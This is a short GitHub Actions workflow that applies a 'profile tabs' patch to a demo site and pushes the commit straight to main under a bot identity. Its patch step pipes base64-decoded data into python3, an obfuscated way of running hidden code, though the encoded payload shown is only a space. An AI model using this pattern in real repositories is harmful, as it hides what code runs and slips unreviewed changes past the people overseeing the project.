name: Temporary profile tabs upgrade
on:
  push:
    branches: [main]
    paths:
      - .github/workflows/profile-tabs-temp.yml
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply profile tabs patch
        run: echo ' ' | base64 -d | python3
      - name: Validate customer JavaScript
        run: node --check demo/js/customer.js
      - name: Commit profile tabs
        run: |
          git config user.name 'KOL Deploy Bot'
          git config user.email 'actions@users.noreply.github.com'
          git add demo/index.html demo/js/customer.js demo/css/customer.css demo/service-worker.js
          git commit -m 'Replace profile accordions with horizontal tabs' || exit 0
          git push origin HEAD:main
